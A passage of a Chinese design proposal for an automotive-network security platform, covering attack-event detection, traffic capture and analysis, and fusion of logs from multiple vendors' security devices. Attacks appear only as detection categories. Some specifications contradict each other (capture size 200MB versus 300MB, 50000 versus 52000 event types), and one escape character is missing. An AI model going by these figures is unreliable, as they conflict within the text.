title="功能实施方案"></a>功能实施方案</h4><ol><li><p>系统具备强大的汽车网络安全分析能力，系统支持接收汽车网络攻防流量数据，以进行全面的安全事件检测与分析。这一特性使系统能够实时监测汽车网络中的流量数据，快速识别潜在的安全威胁，从而有效地保障汽车网络的安全性。</p></li><li><p>在攻击检测方面，系统提供了全面的支持，包括扫描探测、攻击突破、远程控制和窃取利用类型的攻击检测。这涵盖了各种可能的攻击方式，确保系统对多种威胁类型具备敏感性和全面性，为汽车网络的安全提供了有力的保障。</p></li><li><p>系统支持扫描探测类的攻击检测，包括漏洞扫描、TCP SYN扫描、端口扫描、路径遍历、资源泄漏暴露等。具备流量数据的采集、解析、分析技术，通过深度分析流量数据，通过分析规则、特征比对等技术，系统能够准确识别并响应这类潜在的威胁，确保系统安全运行。</p></li><li><p>针对攻击突破类的攻击，系统提供了检测功能，包括缓冲区溢出、XSS攻击、暴力破解、文件下载、代码注入、命令注入等。这一功能确保系统能够及时发现并应对这类具有破坏性的攻击，有效防止攻击者突破汽车网络的安全防线。</p></li><li><p>远程控制类的攻击是系统防御的另一重要方面，包括本地执行代码、安装Rootkit、安装网页后门、特权提升、安装木马等。系统通过实时监测与分析流量，能够识别这些潜在的远程控制威胁，从而防范恶意攻击者对汽车网络的远程操控。</p></li><li><p>系统提供全面的窃取利用类攻击检测功能，包括对窃取利用和篡改破坏等威胁的及时发现与防御。通过对汽车网络流量的深度分析，系统能够识别出窃取利用类攻击的行为，包括恶意窃取和篡改敏感信息，从而有效防范这类具有潜在威胁的攻击行为，保障汽车网络的安全稳定运行。</p></li><li><p>为了让用户更直观了解汽车网络的安全状况，系统支持最近一小时安全事件实时数据的攻击类型统计、危害等级统计、攻击趋势统计以及列表信息展示。这一功能使用户能够及时掌握汽车网络中的安全事件发展态势，有效支持用户在紧急情况下采取迅速而明智的安全应对措施。</p></li><li><p>系统提供了详细的安全事件查看功能，包括时间、规则ID、攻击类型、源IP、源端口、目的IP、目的端口、协议、描述、原始日志等关键信息。通过这一功能，用户可以深入了解每个安全事件的具体细节，从而更全面地评估事件的严重性和紧急性，有助于用户进行更有针对性的安全决策。</p></li><li><p>为了方便用户对历史安全事件进行全面回顾和分析，系统支持基于时间段筛选查看安全事件历史数据的功能。用户可以按照需要灵活地设定时间范围，对历史安全事件进行细致查看，这为用户提供了更灵活的数据检索手段，有助于深入分析汽车网络中的安全事件历史记录。</p></li><li><p>系统支持安全检测事件的外发，以实现更全面的安全事件管理和响应。提供syslog服务器和kafka两种日志外发形式，系统可以将检测到的安全事件信息及时传递到外部系统，帮助用户建立更全面、更强大的安全监控体系。这一功能使系统具备更高的可集成性，满足用户对安全事件数据外发的多样化需求。</p></li><li><p>为了满足用户对安全事件日志的外发需求，系统提供了灵活的Syslog形式日志外发配置功能。用户可以同时配置多个Syslog服务器接收端，包括服务器IP、服务器端口以及协议（TCP或UDP）。这使用户能够根据实际需求将安全事件日志发送至指定的Syslog服务器，实现对安全事件的集中管理与监控，为整体安全架构提供更大的灵活性。</p></li><li><p>系统还支持Kafka形式的日志外发配置，用户可以灵活配置接收端的Kafka连接地址、主题（topic）以及连接账密。这一功能提供了多样化的日志外发选择，用户可根据实际场景和需求选择Syslog或Kafka形式进行日志外发，以更好地满足不同部署环境和日志集中管理的需求。</p></li><li><p>系统提供了基于检测规则的靶向检测策略配置功能，用户可以根据具体需求制定靶向检测策略。支持攻击类型和关联漏洞信息两种方式进行靶向配置，这为用户提供了更多的灵活性和定制化选项，以便更好地适应不同场景下的安全检测需求。</p></li><li><p>对于攻击类型的靶向检测策略配置，系统支持多种攻击类型，包括扫描探测、攻击突破、远程控制、窃取利用等。用户可以基于攻击类型自定义选择规则，实现批量启用与停用操作，从而实现更加精细化的靶向检测。这一功能使用户能够有针对性地对不同攻击类型进行更灵活的管理和控制。</p></li><li><p>系统还支持关联漏洞信息的靶向检测策略配置，关联漏洞信息带有CVE编号。用户可以基于CVE编号对具体漏洞进行识别与关联，从而更有针对性地配置靶向检测策略。这一功能为用户提供了更深层次的安全检测与防御手段，使系统能够更准确地应对特定漏洞相关的威胁，提高整体的安全性能。</p></li><li><p>为了满足系统下发攻击类型靶向检测策略的需求，系统提供了自动关联规则的功能。一旦系统下发攻击类型靶向检测策略指令，系统将自动关联相应规则，并执行批量启用与停用操作。这一自动化的流程大大简化了管理员的管理任务，确保了靶向检测策略的及时生效，为系统整体安全性能提供了强有力的支持。</p></li><li><p>系统支持接收系统下发的试验环境漏洞靶向采集策略指令，能够自动关联配置漏洞相关规则，并批量启用与停用。这一功能使系统能够根据试验环境的特定需求，自动调整漏洞靶向采集策略，确保在不同环境下的安全防护措施能够灵活而高效地部署。</p></li><li><p>为了保障系统规则的安全与合理使用，系统提供了规则限权管理功能。管理员具备新增、修改与删除规则的权限，而普通用户仅可查看规则。这一权限分级机制有效地防止了非授权用户对规则进行恶意操作，维护了系统的安全性与稳定性。</p></li><li><p>系统支持规则的查看与查询，包括规则ID、规则名称、规则关联漏洞信息等详细信息。管理员和普通用户均可通过系统界面轻松访问规则信息，便于了解系统当前规则配置的情况。此外，系统还支持用户添加自定义检测规则，以满足特定场景下的个性化需求，增强了系统的灵活性与可定制性。</p></li><li><p>为了保持规则的时效性和适应性，系统支持基于规则包的定期升级。管理员可以定期升级规则包，系统将展示升级记录，包括升级时间、升级内容等信息。这一功能确保了系统规则能够及时应对新型威胁，不断提升安全防护能力。升级记录的展示也使管理员能够清晰了解系统规则的更新历史，更好地进行安全决策。</p></li><li><p>为了更全面地了解汽车网络中的流量情况，系统支持对原始流量进行协议解析与大小分析。通过对原始流量的深度解析，系统能够获取有关流量的关键信息，包括协议类型以及数据包的大小，为后续的流量分析提供详实的基础数据。</p></li><li><p>协议解析是流量分析的核心功能之一，系统支持多种协议的解析，包括TCP、UDP、ICMP连接信息、DNS解析信息、FTP传输信息、HTTP交互信息、MySQL数据库信息、SMB命令信息、SSH远程连接信息等。这一多样化的协议解析功能使系统能够深入理解汽车网络中不同类型流量的特征和行为，为安全威胁的检测提供了有力的支持。</p></li><li><p>为了有效地管理与存储流量分析结果，系统支持将流量分析的结果通过Kafka方式发送到大数据平台进行存储。这一机制使得分析结果可以被集中存储，并在需要时可以方便地被其他系统或工具调用，实现了流量信息的高效管理和灵活利用。</p></li><li><p>流量分析结果的管理与展示是系统的关键功能之一，基于全要素数据采集、解析技术，系统能够展示丰富的信息，包括源IP、目的IP、源端口、目的端口、协议、大小等关键信息。这使得用户能够直观地了解汽车网络中的流量情况，为实时监测和安全决策提供了可靠的基础数据。</p></li><li><p>系统支持对流量分析结果进行统计分析，包括协议占比分析等。通过对流量数据进行统计分析，用户可以深入了解汽车网络中不同协议的使用情况，从而更好地识别潜在的异常行为和威胁。这一功能为用户提供了全面而深入的流量分析手段，帮助用户更好地维护汽车网络的安全。</p></li><li><p>为了更深入地了解汽车网络中的流量情况，系统支持进行原始流量抓包分析，用户可以基于TCP、UDP协议进行任务创建。这一功能使用户能够有选择性地捕获汽车网络中的流量，以便后续的深度分析和安全检测。通过对原始流量的抓包分析，系统提供了全面而灵活的手段，帮助用户更准确地把握汽车网络的通信状况。</p></li><li><p>流量抓包任务的控制操作是系统的重要功能之一，用户可以根据需要对流量抓包任务进行启动、停止、下载和删除等操作。这一灵活的控制机制使用户能够在不同情景下更好地调整流量抓包任务，保障流量分析的准确性和实时性。通过截图用户可以直观地了解流量抓包任务的执行情况，从而更好地进行后续操作。截图见截图证明。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/70b066d1bc4a2b590bd569cdd22ca57d.png"></p></li><li><p>为了更好地管理流量接收网络接口，系统提供了流量接收网络接口管理功能，包括名称、连接状态及速率。用户可以方便地查看接口的名称、连接状态以及速率等关键信息。这一管理功能使用户能够实时监控汽车网络中的接口情况，帮助及时发现和解决可能的网络问题。通过对接口的管理，用户能够更好地保障流量抓包任务的正常进行，提高整个系统的稳定性。</p></li></ol><h4 id="性能实施方案-29"><a href="#性能实施方案-29" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>系统性能方面，支持单个流量分析抓包任务文件大小为200MB。这一指标反映了系统对于流量数据的处理能力，用户可以在单个任务中灵活设置文件大小，使其更好地适应不同场景下的流量分析需求。该功能不仅有助于用户更精准地捕获特定范围的流量数据，同时也能有效减轻系统负担，确保流量分析任务的高效执行。</li><li>在靶向检测规则方面，系统支持关联漏洞信息的靶向检测规则数量高达20000条。这一指标体现了系统对于复杂、多样化攻击场景的应对能力。用户可以根据实际需求配置大量的靶向检测规则，实现对漏洞信息的全面覆盖，提高系统对潜在威胁的检测准确性和全面性。系统的高规则数量也使其能够更好地适应不断演进的网络安全环境，为用户提供强大的安全防护支持。</li><li>在系统内置安全事件检测规则方面，系统提供了高达40000条的规则数量。这反映了系统在安全事件检测领域的强大处理能力。内置的安全事件检测规则涵盖了各类威胁和攻击行为，使系统能够全面监测并响应网络中的各种潜在风险。系统内置的大规模规则库不仅为用户提供了高度的安全性能，同时也提供了灵活性，使用户能够根据实际需求对规则进行定制，满足不同场景下的安全检测需求。</li></ol><h4 id="技术实现内容-29"><a href="#技术实现内容-29" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="方案设计-16"><a href="#方案设计-16" class="headerlink" title="方案设计"></a>方案设计</h5><p>功能参数为，系统支持接收汽车网络攻防流量数据进行安全事件检测分析。支持多种攻击检测，包括扫描探测、攻击突破、远程控制、窃取利用类型。最近一小时安全事件实时数据攻击类型统计、危害等级统计、攻击趋势统计和列表信息展示。安全事件详情查看，基于时间段筛选查看安全事件历史数据。安全检测事件外发，日志外发服务器配置。基于检测规则的靶向检测策略配置。接收攻击类型靶向检测策略指令，自动关联规则进行批量启用与停用。接收试验环境漏洞靶向采集策略指令。规则限权管理，规则查看与查询。基于规则包定期升级规则并展示升级记录。原始流量协议解析与大小分析。流量分析结果发送到大数据平台存储。流量分析结果管理与展示，流量分析结果统计分析。原始流量抓包分析，流量抓包任务控制操作。流量接收网络接口管理。</p><p>性能参数为，单个流量分析抓包任务文件大小200MB，关联漏洞信息的靶向检测规则20000条，系统内置安全事件检测规则40000条。</p><h5 id="方案介绍-6"><a href="#方案介绍-6" class="headerlink" title="方案介绍"></a>方案介绍</h5><p>安全事件检测依赖于对系统、网络流量用程序的实时监控。通过数据的监控，分析出各种安全事件，其中包括：</p><ol><li>漏洞扫描</li><li>TCP SYN扫描</li><li>端口扫描</li><li>路径遍历</li><li>资源泄漏暴露</li><li>缓冲区溢出</li><li>XSS攻击</li><li>暴力破解</li><li>文件下载</li><li>代码注入</li><li>命令注入</li><li>窃取利用</li></ol><p>安全事件检测整体框架如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c06195a49060af47cddbb74e71567e62.png"></p><p>使用外部威胁情报源的信息，可以帮助安全事件检测更好地识别已知的威胁指标，如恶意IP地址、已知攻击签名等。</p><p>安全事件检测使用事先定义的分析规则和检测规则来分析收集到的事件数据。这些规则可以基于模式匹配、异常检测、行为分析等技术。当检测到潜在威胁或异常行为时，系统应该能够生成实时警报，通知管理员采取适当的响应措施。</p><p>安全事件检测不仅仅是识别威胁，还包括采取措施应对它们。包括阻止攻击流量、隔离受影响系统、更新防御策略等。安全事件检测是一个不断改进的过程。通过分析事件和响应数据，可以识别攻击趋势和攻击模式，并不断优化检测规则和防御策略。</p><p>该模块支持接收汽车网络攻防流量数据，将其用于后续的安全事件检测和分析。这包括原始流量的捕获和存储，以及对流量数据进行协议解析和大小分析，以提供全面的网络情报。安全事件的实时统计和列表展示是模块的核心功能，提供攻击类型、危害等级和趋势分析，使安全团队能够快速识别并响应潜在威胁。用户可以查看每个安全事件的详细信息，包括时间、规则ID、源IP、目的IP、协议等，以便进行深入的调查和分析，并且支持对安全事件历史数据的筛选查看，以便了解攻击趋势和历史威胁情况，从而采取更有针对性的防御措施。该模块还提供规则管理功能，包括添加、修改、删除、查看、查询和升级规则，以确保安全策略的灵活性和实效性，并且支持系统内置安全事件检测规则至少为40000条。</p><p>该模块提供了安全事件外发功能，支持Syslog和Kafka两种形式的日志外发，以便与其他安全系统集成和协作。可以配置靶向检测策略，包括攻击类型和关联漏洞信息的靶向配置，支持关联漏洞信息的靶向检测规则至少20000条。</p><p>为了深入调查安全事件，模块支持原始流量抓包分析，包括任务创建和控制，以获取更多的网络细节，其中每一次进行流量抓包，所生成的文件最大可达到300MB。且管理流量接收的功能涵盖了速率、连接状态以及名称的监测和管理，以确保流量传输的可靠性。</p><p>数据源接口：安全事件检测模块需要与流量镜像接口连接，用于收集原始流量数据。</p><p>事件分析引擎：使用基于规则的事件分析引擎来检测异常或潜在的威胁。包括基于规则的检测、行为分析和模式匹配等技术。检查规则策略可自定义配置以适应检查过程、结果的优化和持续演进。</p><p>事件外发：使用基于非对称加密技术将安全事件数据加密共享外发到指定的服务器（消息中心、数据中心、知识库等），这些数据可用于其他信任系统、用户进行分析和同步。</p><p>实时警报生成：当检测到潜在威胁或异常事件时，安全事件检测模块应能够生成实时警报，以通知安全团队或管理员采取适当的行动。</p><h3 id="安全数据融合"><a href="#安全数据融合" class="headerlink" title="安全数据融合"></a>安全数据融合</h3><h4 id="功能实施方案-30"><a href="#功能实施方案-30" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li><p>在日志源设备管理方面，系统提供全面的管理功能，包括新增、编辑和删除设备。这一功能使得用户能够灵活地管理系统中的日志源设备，随时根据实际需求进行设备的添加、修改或删除。系统通过提供直观的界面，简化了设备管理的流程，帮助用户更高效地维护整个日志源设备生态。</p></li><li><p>设备信息管理方面，系统提供了详细的设备信息管理功能，包括名称、厂商、类型、型号、部署地址等关键信息。通过这一功能，用户可以全面了解每个日志源设备的特征和配置，有助于更有效地进行设备的监控和维护。系统的设备信息管理为用户提供了清晰而全面的设备视图，帮助用户更好地了解整个系统的设备配置情况。</p></li><li><p>为了方便用户进行设备管理，系统支持通过文件上传和下载实现日志源设备的批量导入和导出。用户可以通过这一功能，迅速而便捷地进行设备的批量管理，提高了设备管理的效率。通过截图用户可以清晰地了解文件上传和下载的操作过程，使得设备管理更加直观和方便。截图见截图证明。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4d8ae83c76467621de2a9fb89cb7339a.png"></p></li><li><p>在日志解析测试方面，系统支持对数据源设备的日志进行解析测试。这一功能允许用户在实际应用之前对设备的日志解析进行验证，确保日志解析的准确性和有效性。通过这一测试功能，用户能够更有信心地应用日志数据进行后续的分析和监控工作。</p></li><li><p>为了支持不同传输协议的灵活应用，系统提供了基于TCP和UDP两种传输协议的syslog方式和Kafka消息队列方式进行日志数据接入。这一多样化的接入方式使系统能够适应不同场景下的需求，为用户提供了更多的选择和灵活性。通过支持不同传输协议，系统确保了日志数据的高效而可靠的接入流程，为后续的分析和处理提供了良好的基础。</p></li><li><p>为了有效处理安全事件检测产生的多源异构日志数据，系统提供了强大的数据汇聚、清洗与转发功能。这一功能确保了系统能够高效地接收并整合来自不同来源的日志数据，通过数据清洗与转发，确保日志数据的质量和一致性。通过这一集成的处理流程，系统提供了强大的日志管理能力，为后续的安全事件分析提供了可靠的基础。</p></li><li><p>支持接收汽车攻防演练场景的安全日志，并进行数据清洗、解析与融合。这一功能使得系统能够应对特定场景下的安全日志处理需求，通过数据清洗、解析与融合操作，将原始日志数据转化为可用于进一步分析的格式。这为系统提供了在汽车攻防演练中获取、分析、和响应安全事件的强大能力。</p></li><li><p>支持对多源、异构安全事件的解析处理，能够转换网络安全检测设备日志为标准格式即生成安全事件。这一功能使得系统能够理解和标准化来自不同设备和厂商的安全事件日志，提高了日志数据的可读性和可分析性。通过将异构数据转化为标准格式，系统为用户提供了更一致、更易处理的安全事件信息，有助于提升整个系统的安全性能。</p></li><li><p>为了满足用户对日志数据解析的灵活需求，系统支持快速零代码编程实现不同厂商、不同设备的日志数据解析。这一零代码编程的特性使得用户能够快速、灵活地适应新设备的接入和解析需求，提高了系统的可扩展性和定制性。通过零代码编程，系统为用户提供了更自由、更灵活的解析规则定制方式。</p></li><li><p>为了管理多种异构日志的解析规则，系统提供了规则管理功能，包括新增、编辑和删除解析规则。这一功能使得用户能够方便地维护解析规则库，根据实际需求灵活调整规则配置。通过规则管理，系统为用户提供了规范化和集中化的解析规则管理手段，使得解析过程更加可控和可维护。</p></li><li><p>为了更灵活地管理新增的日志解析规则，系统提供了按流程进行规则配置的功能。用户可以通过该功能逐步配置解析规则，包括具体的解析规则配置和目标字段映射。这一按流程的配置方式使得用户能够更加直观地管理和定制解析规则，适应不同日志格式和源设备的解析需求。通过配置解析规则和字段映射，用户能够更准确地解析日志数据，为后续的分析和应用提供高质量的数据基础。</p></li><li><p>支持解析规则配置管理，包括日志样本、解析方式、字段分隔符、键值分隔符和符号过滤。这一功能使得用户可以灵活配置解析规则的各个方面，包括基础的日志样本、解析方式的选择、字段分隔符和键值分隔符的定制以及符号过滤的配置。通过这些配置选项，用户能够根据不同日志源的特点，定制解析规则以更好地适应实际的日志数据格式。</p></li><li><p>解析方式支持键值对和固定分隔符方式，字段分隔符内置分号、逗号、通道符、tab键等方式，键值分隔符支持等号、冒号、空格等。这一灵活的解析方式支持用户根据实际情况选择最适合的解析方法，使得系统能够广泛适应不同类型和格式的日志数据。通过支持多种解析方式和分隔符选项，系统提供了高度的灵活性和定制性，确保了对异构日志的有效解析和处理。</p></li><li><p>为了满足用户对不同日志格式的解析需求，系统支持基于正则表达式方式进行日志数据解析。正则表达式是一种强大的模式匹配工具，通过支持正则表达式，系统允许用户更细粒度地定义日志格式，提高了解析的精准度和适应性。这一功能为用户提供了更强大的解析工具，使系统能够胜任复杂日志格式的解析任务。</p></li><li><p>支持解析日志字段与目标字段映射关系配置，包括时间、事件ID、源IP地址、目的IP地址、源端口、目的端口、CVE漏洞信息、描述等。通过这一映射关系配置，用户可以根据需要精准地将解析得到的日志字段映射到系统的目标字段，实现对日志数据的更有针对性的解析和处理。这一映射关系的灵活配置使得用户能够更好地满足对不同字段的定制化需求，提高了系统解析和分析的灵活性。</p></li><li><p>为了更好地组织安全事件，系统支持根据事件信息对安全事件进行基础攻击类型的组织。这一功能允许用户根据事件的特征和属性，将安全事件整理和分类为基础攻击类型，从而更有针对性地进行事件分析和响应。通过基础攻击类型的组织，用户能够更清晰地了解系统中发生的安全事件，并采取相应的安全措施。</p></li><li><p>系统提供基础攻击类型知识体系的维护与管理功能，知识体系按层次分类3层，第一层分类覆盖扫描探测类、攻击突破类、远程控制、窃取利用类。这一层次化的分类体系使得系统的攻击类型更有层次感和组织性，方便用户更好地理解和使用知识体系。通过对基础攻击类型的层次分类，系统为用户提供了具体全面的攻击类型知识体系，有助于提升用户对安全事件的理解和处理能力。</p></li><li><p>为了表示与维护安全事件和基础攻击类型之间的关系，系统支持关系知识体系的管理。这一功能使用户能够建立和维护安全事件与基础攻击类型之间的关系，帮助用户更深入地理解不同事件与攻击类型之间的联系。通过维护关系知识体系，系统提供了更丰富的关联信息，为用户提供全面的安全事件分析视图。</p></li><li><p>支持安全事件与攻击类型映射关系的维护，维护信息包括安全事件ID、基础攻击ID、事件描述、源目地址是否交换。通过这一功能，用户可以灵活地管理安全事件与基础攻击类型之间的映射关系，包括事件的具体信息和描述，以及源目地址是否交换等相关信息。这一映射关系的维护使得用户能够更准确地理解不同安全事件与基础攻击类型之间的关系，有助于更有针对性地进行安全事件分析和决策。</p></li><li><p>为了更好地管理与设备型号相关的关系，系统提供基于设备型号进行关系维护的功能。用户可以根据设备型号进行规则的添加、编辑、删除和查询，并支持批量导入、导出和删除管理。这一功能使得用户能够更灵活地管理不同设备型号与安全事件、基础攻击类型之间的关系，有助于满足用户在设备管理方面的多样化需求。通过对设备型号的关系维护，系统为用户提供了更细粒度、更个性化的管理手段。</p></li><li><p>为了更灵活地组织安全事件，系统支持基于关键词分类方式进行安全事件组织。这一功能能够支撑在安全事件与攻击类型映射关系无法覆盖的情况下，通过关键词进行组织与融合。用户可以根据安全事件的关键词属性，利用这一分类方式对事件进行更精细的组织，使得系统能够更全面、更准确地理解和分析安全事件。</p></li><li><p>系统提供了关键词与基础攻击类型映射关系的维护功能，维护信息包括关键词组、攻击类型等。通过这一功能，用户可以灵活地配置关键词与基础攻击类型之间的映射关系，包括定义关键词组和与之关联的攻击类型。这样的映射关系维护使得系统能够更智能地根据关键词对安全事件进行分类，提高了组织和管理的灵活性。</p></li><li><p>系统支持多种逻辑运算符及通配符的关键词管理，逻辑运算符包括&amp;（与）、|（或）、!（非），并支持使用括号()组合关键字并区分优先级。同时，系统还支持通配符，包括‘?’表示一个任意字符、‘*’表示N个任意字符，‘\’表示转换符，位于特殊符号前可将其转换为常规符号。这一强大的关键词管理功能使得用户能够更灵活地定义关键词条件，从而更精细地对安全事件进行分类和组织。</p></li><li><p>系统支持基于应用试验任务的拓扑信息等，进行虚拟局域网与对应网络IP地址等关系抽取与管理。通过这一功能，系统能够根据应用试验任务的拓扑信息抽取虚拟局域网与对应网络IP地址之间的关系，为安全事件的组织和管理提供更多关联信息。这样的关系抽取与管理功能使得系统能够更全面地理解应用试验任务中的网络结构，为安全事件的分类和分析提供更丰富的上下文信息。</p></li><li><p>为了更自动化地关联应用试验任务与基础攻击数据，系统支持基于融合生成基础攻击数据中的VLAN和IP地址，自动关联应用试验任务，并生成基础攻击对应的设备、队伍与靶标信息。这一功能使得系统能够更智能地根据基础攻击数据中的信息，自动关联与生成与应用试验任务相关的设备、队伍和靶标信息，提高了关联性与准确性，降低了用户的手动工作量。</p></li></ol><h4 id="性能实施方案-30"><a href="#性能实施方案-30" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>为了提高系统的适用性与覆盖范围，支持对国内主流安全厂商的检测设备产品日志进行全面的收集、转换、解析和融合处理。系统涵盖了20种不同类型的检测设备，覆盖了主流厂商奇安信、新华三、天融信、绿盟科技、深信服、启明星辰等。通过这一性能指标，用户可以确保系统能够无缝集成并处理来自多种主流安全厂商的检测设备产生的日志数据，从而实现全面的日志管理与安全事件分析。</li><li>系统支持高效的融合生成基础攻击数据，性能达到每秒5000条。这一性能指标确保系统能够在高负载的环境下迅速而准确地处理大量基础攻击数据，满足用户对实时性能的需求。通过高效的融合生成，系统可以为用户提供详实的攻击信息，为安全分析和决策提供有力支持。</li><li>为了更全面地支持安全事件的处理与分析，系统能够融合处理多达50000种不同类型的安全事件。这一性能指标确保系统具备处理各类安全事件的能力，无论是来自基础攻击数据的生成还是其他日志来源的安全事件。通过支持如此广泛的安全事件类型，用户可以在系统中获取更为全面、详尽的安全事件信息，有助于及时发现并应对各类威胁。</li></ol><h4 id="技术实现内容-30"><a href="#技术实现内容-30" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="方案设计-17"><a href="#方案设计-17" class="headerlink" title="方案设计"></a>方案设计</h5><p>功能参数为，系统支持日志源设备管理，设备信息管理。文件上传下载实现日志源设备批量导入导出。日志源设备日志解析测试。基于TCP和UDP的syslog方式和Kafka消息队列方式日志数据接入。接收安全事件检测产生的多源异构日志数据，进行数据汇聚、清洗与转发。接收汽车攻防演练场景安全日志，进行数据清洗、解析与融合。多源异构安全事件解析处理，转换为标准格式安全事件。快速零代码编程实现不同厂商设备日志数据解析。管理多种异构日志解析规则。新增日志解析规则管理，解析规则配置管理。基于正则表达式日志数据解析。解析日志字段与目标字段映射关系配置。基础攻击类型知识体系维护与管理。安全事件与攻击类型映射关系维护。基于设备型号关系维护，关键词分类方式安全事件组织。关键词与基础攻击类型映射关系维护。基于试验任务拓扑信息等，进行虚拟局域网与网络IP地址关系抽取与管理。基于融合生成基础攻击数据中VLAN和IP地址，自动关联应用试验任务。</p><p>性能参数为，支持国内主流安全厂商检测设备产品日志收集、转换、解析、融合，覆盖类型20种，融合生成基础攻击性能5000条/秒，融合安全事件类型50000种。</p><p>随着智能汽车网络的复杂性增加，对网络攻防活动的监控与分析变得越来越重要。本系统旨在实现对智能汽车网络中的安全事件进行实时检测与分析，能够处理各类攻击类型，并通过流量分析提供深入的网络安全态势感知。系统将支持事件检测、流量抓包、协议解析、安全事件外发等功能，确保网络安全防护的及时性和有效性。</p><p>安全事件检测分析</p><p>攻防流量数据接收：支持接收汽车网络攻防流量数据进行安全事件检测分析。</p><p>攻击类型检测：支持扫描探测、攻击突破、远程控制、窃取利用类型攻击检测。</p><p>攻击检测细分：支持具体攻击类型的详细检测。</p><p>实时安全事件统计：支持最近一小时安全事件实时数据的统计与展示。</p><p>安全事件详情查看：支持查看安全事件的详细信息。</p><p>安全事件历史数据查看：支持基于时间段筛选查看安全事件历史数据。</p><p>安全检测事件外发：支持安全检测事件的外发。</p><p>检测策略与规则管理</p><p>靶向检测策略配置：支持基于检测规则的靶向检测策略配置。</p><p>靶向检测策略执行：支持接收系统下发的靶向检测策略指令。</p><p>规则限权管理：支持对检测规则的权限管理。</p><p>规则查看与查询：支持规则的查看与查询。</p><p>规则包升级：支持基于规则包的定期升级。</p><p>流量分析与管理</p><p>原始流量协议解析：支持对原始流量进行协议解析。</p><p>流量分析结果管理：支持对流量分析结果进行管理与展示。</p><p>流量统计分析：支持对流量分析结果进行统计分析。</p><p>流量抓包分析：支持进行原始流量抓包分析。</p><p>流量抓包任务管理：支持流量抓包任务的控制操作。</p><p>流量接收网络接口管理：支持流量接收网络接口的管理。</p><p>流量抓包任务文件大小：支持单个流量分析抓包任务文件大小为200MB。</p><p>靶向检测规则数量：支持关联漏洞信息的靶向检测规则20000条。</p><p>内置安全事件检测规则数量：支持系统内置安全事件检测规则40000条。</p><p>本系统为智能汽车网络安全提供了一个全面的事件检测与流量分析解决方案。通过实时监控和分析网络流量，系统能够及时发现并响应各类安全事件，同时提供详细的事件信息和历史数据查看功能。系统的外发功能能够将重要事件信息及时传递到其他安全系统中，确保安全防护的连贯性。此外，系统支持的靶向检测策略和规则管理功能，使得安全防护更加灵活和精确。通过高性能的流量分析和抓包功能，系统能够处理大规模的数据，满足智能汽车网络安全监控的需求。</p><h5 id="方案介绍-7"><a href="#方案介绍-7" class="headerlink" title="方案介绍"></a>方案介绍</h5><p>面对不同的安全数据来源比如防火墙、IDS、IPS、WAF、EDR等安全设备，这些数据通常具有不同格式、结构和粒度，需要对这些数据进行去除重复数据、处理缺失数据、解决数据不一致性等处理，并将数据结构和数据内容多样的数据解析并整合成统一的数据集，便于后续攻击检测研判、安全分析评估等理解与使用。</p><p>系统提供了强大的功能，能够对国内一些常见大众的安全厂商检测设备产品日志进行全面处理，包括融合、解析、收集以及转换析等关键操作。性能上，系统每秒能够融合生成至少5000条基础攻击数据，并且能够融合的安全事件类型数量高达52000种。此外，系统还可以处理超过20种不同类型的检测设备，覆盖了常见厂商，如启明星辰、深信服、绿盟科技、奇安信、新华三以及天融信等。这一系列强大的功能将大幅简化安全数据处理的复杂性，使安全团队能够更轻松地理解和利用这些多样化的安全数据。</p><p>该模块提供了一套完整的安全事件管理和组织体系。首先，用户可以根据事件信息对安全事件进行基础攻击类型的组织，使安全事件更有条理性和可理解性。其次，系统支持基础攻击类型知识体系的维护与管理，这一体系按层次分类，其中第一层分类超危窃取利用类、高危远程控制、低危扫描探测类、中危攻击突破类。此外，系统还能够维护安全事件和基础攻击类型之间的关系知识体系，涵盖了维护源目地址是否交换、事件描述、基础攻击ID以及安全事件ID等信息。系统的功能还包括支持基于设备型号进行关系维护，用户可以方便地添加、修改、删除和查询规则，同时支持批量导入、导出和删除的管理操作。另外，系统提供了基于关键词分类方式的安全事件组织功能，这有助于在无法完全覆盖安全事件与攻击类型映射关系的情况下进行组织和融合。最后，系统还允许用户维护关键词与基础攻击类型之间的映射关系，包括管理关键词组和攻击类型等相关信息。在关键词管理中，用户可灵活使用多种通配符和逻辑运算符。通配符方面，支持使用’?’表示任意一个字符，’*‘表示N个任意字符，’’表示转义符，放置于特殊符号前可将其转换为普通符号。逻辑运算符涵盖与(&amp;)、或(|)、非(!)，同时允许使用括号()来组合关键字并能够区分优先级。</p><p>安全数据获取及对应文件标准化格式如下示意，从安全防护设备中实时获取安全数据。将从安全防护设备中获得的原始数据日志输入到系统中。其中安全防护设备日志文件包含“源IP/源端口/目的IP/目的端口/警告类型”等信息，对日志数据使用“/”作为每一项信息的分隔符对重要信息进行存储，形成标准化日志格式。例如：防火墙处的日志格式为“12.XX.XX.XX/设备X1/时间t1/行为日志等”，IDS处的日志格式为“源IP/入侵检测IP/时间戳/事件等”，WAF处的日志格式为“源IP/访问时间戳/是否阻断等”，EDR处的日志格式为“源IP/时间戳/目标IP/认证结果等”。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/13ca50808fe2085653019cba248e4e6c.png"></p><p>系统能够不同数据源的多源异构日志数据，将安全防护设备获得的标准化日志数据进行整合，创建统一数据库及数据库表，其数据列包括源IP、源端口、目的IP、目的端口、时间戳、事件行为、告警类型等信息。其中对日志文件中的事件行为、告警类型等文本信息采用分类等技术对日志进行事件及告警分类，提取事件行为要素。对于多条数据记录，采用聚类等技术将相似来源、相似行为、相似目的数据记录从不同角度进行聚类，并基于聚类结果进一步提取安全数据要素。如下图所示，对不同行为日志进行文本分类，从而提取三条行为日志中的行为要素A,行为要素B和行为要素C等，再利用聚类技术将三条记录进行聚类。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 